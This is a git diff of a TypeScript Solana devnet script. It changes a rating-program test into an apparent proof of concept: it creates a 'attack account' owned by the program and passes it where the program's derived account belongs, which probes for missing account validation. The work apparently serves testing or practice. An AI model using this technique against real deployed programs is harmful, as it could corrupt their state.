@@ -1,69 +1,102 @@
 import fs from 'fs';
 import os from 'os';
 import * as web3 from '@solana/web3.js';
-  import { Buffer } from 'buffer';
-  
-  async function testRatingProgram(
-    connection: web3.Connection,
-    programId: web3.PublicKey,
-    payer: web3.Keypair
-  ) {
-    // Create or fetch the program's PDA account
-    const [programAccount] = await web3.PublicKey.findProgramAddressSync(
-      [Buffer.from('rating')],
-      programId
+import { Buffer } from 'buffer';
+
+async function main() {
+  const connection = new web3.Connection('https://api.devnet.solana.com', 'confirmed');
+  const programId = new web3.PublicKey('43ddfovLXPAwnAqGMG5Xe8M6NVj9RqUBFaDNwkkAoG3s');
+  const payer = web3.Keypair.fromSecretKey(
+    Uint8Array.from(JSON.parse(fs.readFileSync(`${os.homedir()}/.config/solana/id.json`, 'utf-8')))
     );
+  console.log(`Payer is ${payer.publicKey}`)
+
+  const andy = new web3.PublicKey('Andy1111111111111111111111111111111111111111')
   
-    // Create the instruction data (rating from 0-10)
-    const rating = 8; 
-    const data = Buffer.alloc(8);
-    data.writeBigUInt64LE(BigInt(rating));
-  
-    // Create the transaction
-    const transaction = new web3.Transaction().add({
-      keys: [
-        {
-          pubkey: programAccount,
-          isSigner: false,
-          isWritable: true,
-        },
-        {
-          pubkey: payer.publicKey,
-          isSigner: true,
-          isWritable: true,
-        },
-        {
-          pubkey: web3.SystemProgram.programId,
-          isSigner: false,
-          isWritable: false,
-        },
-      ],
-      programId: programId,
-      data: data,
-    });
-  
-    // Send and confirm the transaction
-    try {
-      const signature = await web3.sendAndConfirmTransaction(
-        connection,
-        transaction,
-        [payer]
-      );
-      console.log('Transaction successful:', signature);
-    } catch (error) {
-      console.error('Error:', error);
-    }
-  }
-  
-  // Example usage:
-  async function main() {
-    const connection = new web3.Connection('https://api.devnet.solana.com', 'confirmed');
-    const programId = new web3.PublicKey('GbJ8tYwgUpUemTLBnN2XnQ8dU1waS3U7DmpVSBuJ1CU1');
-    const payer = web3.Keypair.fromSecretKey(
-      Uint8Array.from(JSON.parse(fs.readFileSync(`${os.homedir()}/.config/solana/id.json`, 'utf-8')))
-      );
-  
-    await testRatingProgram(connection, programId, payer);
+  await testRatingProgram(connection, programId, payer, andy);
   }
   
   main().catch(console.error);
+
+async function testRatingProgram(
+  connection: web3.Connection,
+  programId: web3.PublicKey,
+  payer: web3.Keypair,
+  andy: web3.PublicKey
+) {
+
+  // Create the attack account owned by payer
+  const attackAccount = web3.Keypair.generate();
+  const attackAccountPubKey = attackAccount.publicKey
+
+  // Calculate space and rent
+  const space = 89; 
+  const lamports = await connection.getMinimumBalanceForRentExemption(space);
+  
+  // Create attack account instruction
+  const createAccountIx = web3.SystemProgram.createAccount({
+    fromPubkey: payer.publicKey,
+    newAccountPubkey: attackAccount.publicKey,
+    lamports,
+    space,
+    programId: programId,
+  });
+
+  // Create and send transaction to create attack account
+  const tx = new web3.Transaction().add(createAccountIx);
+  
+  try {
+    const signature = await web3.sendAndConfirmTransaction(
+      connection,
+      tx,
+      [payer, attackAccount] // Need to sign with both payer and new account
+    );
+    console.log('Account created successfully:', signature);
+    console.log('Attack account address:', attackAccount.publicKey.toString());
+    console.log(`Attack account owner is ${(await connection.getAccountInfo(attackAccount.publicKey))?.owner.toString()}`);
+  } catch (error) {
+    console.error('Error creating account:', error);
+    return;
+  }
+
+  // Now let's ping the contract
+  // Create the instruction data (rating from 0-10)
+  const rating = 8; 
+  const data = Buffer.alloc(8);
+  data.writeBigUInt64LE(BigInt(rating));
+
+  // Create the transaction
+  const transaction = new web3.Transaction().add({
+    keys: [
+      {
+        pubkey: attackAccountPubKey,
+        isSigner: false,
+        isWritable: true,
+      },
+      {
+        pubkey: payer.publicKey,
+        isSigner: true,
+        isWritable: true,
+      },
+      {
+        pubkey: web3.SystemProgram.programId,
+        isSigner: false,
+        isWritable: false,
+      },
+    ],
+    programId: programId,
+    data: data,
+  });
+
+  // Send and confirm the transaction
+  try {
+    const signature = await web3.sendAndConfirmTransaction(
+      connection,
+      transaction,
+      [payer]
+    );
+    console.log('Transaction successful:', signature);
+  } catch (error) {
+    console.error('Error:', error);
+  }
+}
